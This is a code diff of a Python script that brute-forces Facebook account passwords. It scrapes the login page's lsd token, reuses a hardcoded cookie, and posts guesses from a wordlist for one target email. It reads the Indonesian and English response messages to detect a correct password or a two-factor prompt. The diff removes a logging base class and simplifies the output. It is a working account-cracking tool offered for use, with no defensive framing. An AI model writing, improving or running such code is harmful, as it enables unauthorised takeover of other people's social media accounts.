@@ -1,8 +1,7 @@
 import requests, sys, time, random, re
 from bs4 import BeautifulSoup
-from app import Application
 
-class Facebook(Application):
+class Facebook():
 
     url = 'https://web.facebook.com/login.php'
     headers = {
@@ -25,21 +24,6 @@ class Facebook(Application):
         self.account['email'] = email
         self.account['password'] = password
         self.customfile = customfile
-        print(super().logtime(), super().colored('Start Facebook Bruteforce', 'blue'))
-        dot = 0
-        onwhile = True
-        while onwhile:
-            dot += 5
-            print(super().logtime(), super().colored(' ' * dot, 'blue', 'on_white') + f' {dot}%', end = "\r")
-            time.sleep(0.1)
-            if(dot == 100): onwhile = False
-        print('')
-        print(super().logtime(), 'Checking Email...')
-        if re.search('^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$', email) is None:
-            print(super().logtime(), super().colored('Email Not Valid. Check The Email, must be email@servermail.abc', 'red'))
-            sys.exit()
-        else:
-            print(super().logtime(), super().colored('Email Is Valid', 'green'))
         self.run()
 
     def CreateForm(self):
@@ -47,15 +31,15 @@ class Facebook(Application):
         self.cookies = {
             'fr' : '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'
         }
-        print(super().logtime(), 'Using ' + self.headers['User-Agent'])
         data = requests.get(self.url, headers = self.headers)
         # 200
         if data.status_code == 200:
             for i in data.cookies:
                 self.cookies[i.name] = i.value
-            data = BeautifulSoup(data.text,'html.parser').form
+            data = BeautifulSoup(data.text,'html.parser')
+            search = data.find(attrs={"name": "lsd"})
             if data.input['name'] == 'lsd':
-                form['lsd'] = data.input['value']
+                form['lsd'] = search['value']
             return (form, self.cookies)
         # 404/500/403
         else:
@@ -68,7 +52,7 @@ class Facebook(Application):
         response = requests.post(self.url, data = self.payload, cookies = self.cookies, headers = self.headers)
 
         if 'Aktivitas terbaru mungkin mempengaruhi keamanan akun Anda' in response.text or 'Recent activity might affect the security of your account' in response.text or 'Harap Konfirmasikan Identitas Anda' in response.text:
-            print(super().colored(f'Password is {password}', 'blue'), end="\r")
+            print((f'Password is {password}'), end="\r")
             sys.exit()
             return True
         if 'Email yang Anda masukkan tidak cocok dengan akun mana saja. Buat sebuah akun.' in response.text or "The email address that you've entered doesn't match any account. Sign up for an account." in response.text:
@@ -76,17 +60,17 @@ class Facebook(Application):
             sys.exit()
             return True
         if 'Ada masalah pada permintaan ini. Kami berusaha untuk menyelesaikannya dengan segera.' in response.text:
-            print(super().colored("Account Can't Be Process In Backend.", 'red'), end="\r")
+            print(("Account Can't Be Process In Backend."), end="\r")
             return False
         if  "You've entered an old password" in response.text:
             print( " Old Password.")
         if "Kami akan memandu Anda melalui beberapa langkah untuk membuka kunci akun Anda." in response.text:
-            print(super().colored("Password Correct But Have Two Verification", 'blue'), end="\r")
+            print(("Password Correct But Have Two Verification", 'blue'), end="\r")
         if "We won’t support this browser soon. For a better experience, we recommend using another browser." in response.text:
-            print(super().colored("User Agent Not Support For Now. Please Try Again...", 'yellow'), end="\r")
+            print(("User Agent Not Support For Now. Please Try Again..."), end="\r")
             sys.exit()
         else:
-            print(super().colored("Could Not Resolve", 'red'), end="\r")
+            print(("Could Not Resolve", 'red'), end="\r")
             return False
 
     def run(self):
@@ -100,7 +84,7 @@ class Facebook(Application):
                 i = 0
                 for data in file:
                     i += 1
-                    print(super().logtime(), "({i}/{sumfile})".format(i = str(i), sumfile=sumfile), end="-> ")
+                    print("({i}/{sumfile})".format(i = str(i), sumfile=sumfile), end="-> ")
                     self.commit(self.account['email'], data)
 
             if self.customfile:
@@ -108,7 +92,7 @@ class Facebook(Application):
                     file = open(self.customfile, 'r')
                     filebinary = open(self.customfile, 'rb')
                 except:
-                    print(super().logtime(), super().colored(f"{self.customfile} not founds. Create wordlist now", 'red'))
+                    print((f"{self.customfile} not founds. Create wordlist now"))
                 finally:
                     success()
 
@@ -117,7 +101,7 @@ class Facebook(Application):
                     file = open('passwords.txt', 'r')
                     filebinary = open('passwords.txt', 'rb')
                 except:
-                    print(super().logtime(), super().colored("passwords.txt not founds. Create wordlist now", 'red'))
+                    print(("passwords.txt not founds. Create wordlist now"))
                 finally:
                     success()
                     
@@ -126,7 +110,7 @@ class Facebook(Application):
             email = self.account['email']
             password = self.account['password']
             if len(password) != 0 and len(password) >= 6:
-                print(super().logtime(), "({i})_{password}".format(i = str(0), password = password), end="-> ")
+                print("({i})_{password}".format(i = str(0), password = password), end="-> ")
                 self.commit(email, password)
             else:
                 print('Password Must Be Length More 6')
